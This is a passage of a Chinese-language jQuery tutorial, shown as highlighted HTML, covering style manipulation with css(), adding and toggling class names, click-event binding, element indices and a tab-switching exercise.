class="string">"div1"</span>&gt;</span>div元素<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="10-4-jquery样式操作"><a href="#10-4-jquery样式操作" class="headerlink" title="10.4 jquery样式操作"></a>10.4 jquery样式操作</h2><h3 id="10-4-1-jquery用法思想二"><a href="#10-4-1-jquery用法思想二" class="headerlink" title="10.4.1 jquery用法思想二"></a>10.4.1 <strong>jquery用法思想二</strong></h3><p>同一个函数完成取值和赋值</p><h3 id="10-4-2-操作行间样式"><a href="#10-4-2-操作行间样式" class="headerlink" title="10.4.2 操作行间样式"></a>10.4.2 <strong>操作行间样式</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取div的样式</span></span><br><span class="line">$(<span class="string">"div"</span>).css(<span class="string">"width"</span>);</span><br><span class="line">$(<span class="string">"div"</span>).css(<span class="string">"color"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置div的样式</span></span><br><span class="line">$(<span class="string">"div"</span>).css(<span class="string">"width"</span>,<span class="string">"30px"</span>);</span><br><span class="line">$(<span class="string">"div"</span>).css(<span class="string">"height"</span>,<span class="string">"30px"</span>);</span><br><span class="line">$(<span class="string">"div"</span>).css(&#123;<span class="attr">fontSize</span>:<span class="string">"30px"</span>,<span class="attr">color</span>:<span class="string">"red"</span>&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"js/jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> $div1 = $(<span class="string">'#div1'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            $div1.css(<span class="string">"width"</span>, <span class="string">"30px"</span>);</span></span><br><span class="line"><span class="javascript">            $div1.css(<span class="string">"height"</span>, <span class="string">"30px"</span>);</span></span><br><span class="line"><span class="javascript">            $div1.css(&#123;<span class="attr">fontSize</span>: <span class="string">"30px"</span>, <span class="attr">color</span>: <span class="string">"red"</span>&#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            alert($div1.css(<span class="string">'width'</span>));</span></span><br><span class="line"><span class="javascript">            alert($div1.css(<span class="string">'color'</span>));</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="comment">// 原生js无法读取行间没有定义的css属性值,但是可以读取行间已定义的css属性值</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> oDiv = <span class="built_in">document</span>.getElementById(<span class="string">"box"</span>);</span></span><br><span class="line"><span class="javascript">            alert(oDiv.style.height);   <span class="comment">// 空</span></span></span><br><span class="line"><span class="javascript">            alert(oDiv.style.fontSize); <span class="comment">// 20px</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">        &#125;);</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"div1"</span>&gt;</span>div元素<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"box"</span> <span class="attr">style</span>=<span class="string">"font-size: 20px;"</span>&gt;</span>div元素<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>特别注意</strong><br>选择器获取的多个元素，获取信息获取的是第一个，比如：$(“div”).css(“width”)，获取的是第一个div的width。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"js/jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> $div = $(<span class="string">'div'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            alert($div.css(<span class="string">"color"</span>)); <span class="comment">// rgb(0,128,0) =&gt; green</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">        &#125;);</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color: green"</span>&gt;</span>1.div元素<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">"color: red"</span>&gt;</span>2.div元素<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="10-4-3-操作样式类名"><a href="#10-4-3-操作样式类名" class="headerlink" title="10.4.3 操作样式类名"></a>10.4.3 <strong>操作样式类名</strong></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#div1"</span>).addClass(<span class="string">"divClass2"</span>) <span class="comment">//为id为div1的对象追加样式divClass2,不是替换成divClass2</span></span><br><span class="line">$(<span class="string">"#div1"</span>).removeClass(<span class="string">"divClass"</span>)  <span class="comment">//移除id为div1的对象的class名为divClass的样式</span></span><br><span class="line">$(<span class="string">"#div1"</span>).removeClass(<span class="string">"divClass divClass2"</span>) <span class="comment">//移除多个样式</span></span><br><span class="line">$(<span class="string">"#div1"</span>).toggleClass(<span class="string">"anotherClass"</span>) <span class="comment">//重复切换anotherClass样式，比如点击增加，再点击移除等操作</span></span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"js/jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> $div = $(<span class="string">'.box'</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            $div.addClass(<span class="string">"big"</span>);</span></span><br><span class="line"><span class="javascript">            $div.removeClass(<span class="string">"box"</span>);</span></span><br><span class="line"><span class="javascript">            $div.toggleClass(<span class="string">"box"</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">        &#125;);</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.box</span>&#123;</span></span><br><span class="line"><span class="undefined">            width: 100px;</span></span><br><span class="line"><span class="undefined">            height: 100px;</span></span><br><span class="line"><span class="undefined">            background-color: gold;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.big</span>&#123;</span></span><br><span class="line"><span class="undefined">            font-size: 30px;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span>div元素<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="10-5-绑定click事件"><a href="#10-5-绑定click事件" class="headerlink" title="10.5 绑定click事件"></a>10.5 绑定click事件</h2><p>给元素绑定click事件，可以用如下方法：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'#btn1'</span>).click(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 内部的this指的是原生对象</span></span><br><span class="line">    <span class="comment">// 使用jquery对象用 $(this)</span></span><br><span class="line"></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"js/jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// 绑定click事件</span></span></span><br><span class="line"><span class="javascript">            $(<span class="string">"#btn"</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">                <span class="comment">// if ($(".box").hasClass("col01")) &#123;</span></span></span><br><span class="line"><span class="javascript">                <span class="comment">//     $(".box").removeClass("col01");</span></span></span><br><span class="line"><span class="javascript">                <span class="comment">// &#125; else &#123;</span></span></span><br><span class="line"><span class="javascript">                <span class="comment">//     $(".box").addClass("col01");</span></span></span><br><span class="line"><span class="javascript">                <span class="comment">// &#125;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">                <span class="comment">// 简化写法</span></span></span><br><span class="line"><span class="javascript">                $(<span class="string">".box"</span>).toggleClass(<span class="string">"col01"</span>);</span></span><br><span class="line"><span class="undefined">            &#125;);</span></span><br><span class="line"><span class="undefined">        &#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.box</span> &#123;</span></span><br><span class="line"><span class="undefined">            width: 100px;</span></span><br><span class="line"><span class="undefined">            height: 100px;</span></span><br><span class="line"><span class="undefined">            background-color: gold;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.col01</span> &#123;</span></span><br><span class="line"><span class="undefined">            background-color: green;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">"切换样式"</span> <span class="attr">id</span>=<span class="string">"btn"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"box"</span>&gt;</span>div元素<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="10-5-1-获取元素的索引值"><a href="#10-5-1-获取元素的索引值" class="headerlink" title="10.5.1 获取元素的索引值"></a>10.5.1 <strong>获取元素的索引值</strong></h3><p>有时候需要获得匹配元素相对于其同胞元素的索引位置，此时可以用index()方法获取</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> $li = $(<span class="string">'.list li'</span>).eq(<span class="number">1</span>);</span><br><span class="line">alert($li.index()); <span class="comment">// 弹出1</span></span><br><span class="line">......</span><br><span class="line">&lt;ul <span class="class"><span class="keyword">class</span></span>=<span class="string">"list"</span>&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">1</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;2&lt;/</span>li&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">4</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">    &lt;li&gt;5&lt;/</span>li&gt;</span><br><span class="line">    &lt;li&gt;<span class="number">6</span>&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">&lt;/u</span>l&gt;</span><br></pre></td></tr></table></figure><p><strong>课堂练习</strong></p><p>选项卡<br></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--不能直接在jquery的引入标签里写js代码，需要另写一个script标签，在这个里面那些js代码--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"js/jquery-3.4.1.min.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> $btn = $(<span class="string">".btns input"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> $div = $(<span class="string">".cons div"</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            $btn.click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">                <span class="comment">// this指的是原生this,它表示当前点击的对象</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">                <span class="comment">// 当前点击的按钮加上current样式后，除了当前，其他的按钮去掉current样式</span></span></span><br><span class="line"><span class="javascript">                $(<span class="keyword">this</span>).addClass(<span class="string">"current"</span>).siblings().removeClass(<span class="string">"current"</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">                <span class="comment">// alert($(this).index()); // 查看当前点击对象的索引值</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">                <span class="comment">// 当前点击的按钮对应索引值的div加上active样式，其他的去掉active样式</span></span></span><br><span class="line"><span class="javascript">                $div.eq($(<span class="keyword">this</span>).index()).addClass(<span class="string">"active"</span>).siblings().removeClass(<span class="string">"active"</span>);</span></span><br><span class="line"><span class="undefined">            &#125;)</span></span><br><span class="line"><span class="undefined">        &#125;);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span> <span class="attr">type</span>=<span class="string">"text/css"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.btns</span> <span class="selector-tag">input</span> &#123;</span></span><br><span class="line"><span class="undefined">            width: 100px;</span></span><br><span class="line"><span class="undefined">            height: 40px;</span></span><br><span class="line"><span class="css">            <span class="selector-tag">background-color</span>: <span class="selector-id">#dddddd</span>;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.btns</span> <span class="selector-class">.current</span> &#123;</span></span><br><span class="line"><span class="undefined">            background-color: gold;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.cons</span> <span class="selector-tag">div</span> &#123;</span></span><br><span class="line"><span class="undefined">            width: 500px;</span></span><br><span class="line"><span class="undefined">            height: 300px;</span></span><br><span class="line"><span class="undefined">            background-color: gold;</span></span><br><span class="line"><span class="undefined">            display: none;</span></span><br><span class="line"><span class="undefined">            text-align: center;</span></span><br><span class="line"><span class="undefined">            line-height: 300px;</span></span><br><span class="line"><span class="undefined">            font-size: 30px;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="css">        <span class="selector-class">.cons</span> <span class="selector-class">.active</span> &#123;</span></span><br><span class="line"><span class="undefined">            display: block;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"btns"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">"01"</span> <span class="attr">class</span>=<span class="string">"current"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">"02"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">name</span>=<span class="string">""</span> <span class="attr">value</span>=<span class="string">"03"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"cons"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"active"</span>&gt;</span>选项卡一的内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>选项卡二的内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>选项卡三的内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span 